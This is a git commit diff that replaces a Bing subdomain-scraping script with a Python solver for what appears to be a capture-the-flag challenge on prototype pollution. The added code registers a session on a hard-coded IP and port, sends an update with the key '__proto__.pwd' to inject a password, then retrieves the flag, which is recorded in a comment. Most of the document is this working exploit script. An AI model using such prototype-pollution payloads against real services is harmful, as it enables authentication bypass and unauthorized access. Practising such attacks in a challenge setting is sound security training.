70d42422e01fd3c50bfeef6992a19199d9342a10
xiaoxiaoran <2425940130@qq.com>
2021-08-27 09:44:40 +0800

    源链污染

--- temp.py
+++ temp.py
@@ -1,33 +1,31 @@
-# 过Bing搜索引擎（网址为https: // cn.bing.com /）进行子域名搜集
 import requests
-from bs4 import BeautifulSoup 
-from urllib.parse import urlparse 
-import sys 
+import random
+from bs4 import BeautifulSoup
+import re
+import base64
+s = requests.session() #保持同一个会话
+def reg(url):
+    url=url+"reg"
+    r=s.get(url)
+    print(r.text)
 
-def bing_search(site, pages): 
-    Subdomain = [] 
-    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/ 20100101 Firefox/60.0', 'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip,deflate', 'referer': "http://cn.bing.com/search?q=email+site%3abaidu. com&qs=n&sp=-1&pq=emailsite%3abaidu.com&first=2&FORM=PERE1" } 
-    for i in range(1,int(pages)+1): 
-        url = "https://cn.bing.com/search?q=site%3a"+site+"&go=Search&qs=ds&first="+ str((int(i)-1)*10) +"&FORM=PERE" 
-        conn = requests.session() 
-        conn.get('http://cn.bing.com', headers=headers) 
-        html = conn.get(url, stream=True, headers=headers, timeout=8) 
-        soup = BeautifulSoup(html.content, 'html.parser') 
-        job_bt = soup.findAll('h2') 
-        for i in job_bt: 
-            link = i.a.get('href') 
-            domain = str(urlparse(link).scheme + "://" + urlparse(link).netloc) 
-            if domain in Subdomain: 
-                pass 
-            else:
-                Subdomain.append(domain) 
-                print(domain) 
-if __name__ == '__main__': 
-    # site=baidu.com 
-    if len(sys.argv) == 3: 
-        site = sys.argv[1] 
-        page = sys.argv[2] 
-    else:
-        print ("usage: %s baidu.com 10" % sys.argv[0]) 
-        sys.exit(-1) 
-    Subdomain = bing_search(site, page)
+def update(url,data):
+    url=url+"update"
+    print(url)
+    r=s.post(url,data=data)
+    print(r.text)
+def getflag(url,data):
+    url=url+"getflag"
+    r=s.post(url,data=data)
+    print(r.text)
+
+url="http://114.67.246.176:15937/"
+reg(url)
+data={"attrkey":"age","attrval":"40"}
+update(url,data)
+data={"attrkey":"__proto__.pwd","attrval":"222"}
+update(url,data)
+data={"password":"222","key":"pwd"}
+getflag(url,data)
+
+# flag{c0874e122c4cd1fae09e80cc7b507c3c}
